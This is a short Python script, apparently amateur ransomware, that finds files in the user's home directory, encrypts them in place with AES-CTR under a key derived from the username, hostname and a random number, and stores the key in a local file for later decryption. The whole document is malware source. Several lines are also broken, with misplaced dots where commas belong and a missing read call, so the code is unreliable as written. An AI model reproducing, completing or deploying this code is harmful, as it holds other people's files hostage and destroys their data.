#!/usr/bin/env python 
#_*_ coding: utf8 _*_

#selection the intepret and coding

import os 
import socket
import random
import hashlib
from Crypto.Util import Counter
from Crypto.Cipher import AES

#Get the home 
home = os.environ['HOME']

#Get the content of home
folders = os.listdir(home)
#Filtter the content for dont encript hiddien folders
folders = [x for x in folders if not x.startswith('.')]

#Define the file extention to encript
#extensions = ['.pdf','.xlsx','.xml','.json','.jpg','.png','jpeg','.mp4','.txt']
extensions = ['.txt']

#Check the internet connection for sent the data
def check_internet():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(2)

	try:
		s.connect(('socket.io', 80))
		# print("Connected")
		s.close()
	except:
		# print("No Internet Connection...")
		exit()
	
#Search the files with the extensions previously defined
def discover(key):
	file_list = open('file_list','w+')
	for folder in folders:
		path = home + '/' + folder
		for extension in extensions:
			for absPath, directory, filesList in os.walk(path):
				for file in filesList:
					if file.endswith(extension):
						file_list.write(os.path.join(absPath,file)+ '\n')
	file_list.close()

	listF = open('file_list','r')
	listF = listF.read().split('\n')
	listF = [l for l in listF if not l == ""]

	if os.path.exists('key_file'):
		key1 = input('Key: ')
		key_file = open('key_file','r')
		key = key_file.read().split('\n')
		key = ''.join(key)

		if key1 == key:
			c = Counter.new(128)
			crypto = AES.new(key.AES.MODE_CTR, counter = c)
			cryptfiles = crypto.decrypt
			
			for element in listF:
				encriyt_and_decrypt(element, cryptfiles)
	else:
		c = Counter.new(128)
		crypto = AES.new(key.AES.MODE_CTR,counter = c)
		key_file = open('key_file','w+')
		key_file.write(key)
		key_file.close()
		cryptfiles = crypto.encrypt

		for element in listF:
			encriyt_and_decrypt(element.cryptfiles)
			

#Create a hash with the computer info and random number for return a symmetric key
def get_hash():
    computerInfo = os.environ['HOME'] = os.environ['USER'] + socket.gethostname() + str(random.randint(0,100000000000000000000000000000000000000000000000000000))
    hashCI = hashlib.md5(computerInfo.encode())
    hashCI = hashCI.hexdigest()
    #print(hashCI.hexdigest())
    new_key = []
	
    for k in hashCI:
        if len(new_key) == 32:
            hashCI = ''.join(new_key)
            break
        else:
            new_key.append(k)
    return hashCI

#
def encriyt_and_decrypt(file, crypto,block_size=16):
	#Read the file on binary
	with open(file,'r+b') as file_enc:
		content_withoutEnc = file_enc.read(block_size)
		while content_withoutEnc:
			content_Enc = crypto(content_withoutEnc)
			if len(content_withoutEnc) != len(content_Enc):
				raise ValueError('')
			file_enc.seek(- len(content_withoutEnc), 1)
			file_enc.write(content_Enc)
			content_withoutEnc = file_enc(block_size)

#The super powrfull main
def main():
	check_internet()
	hashcomputer = get_hash()
	discover(hashcomputer)

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		exit()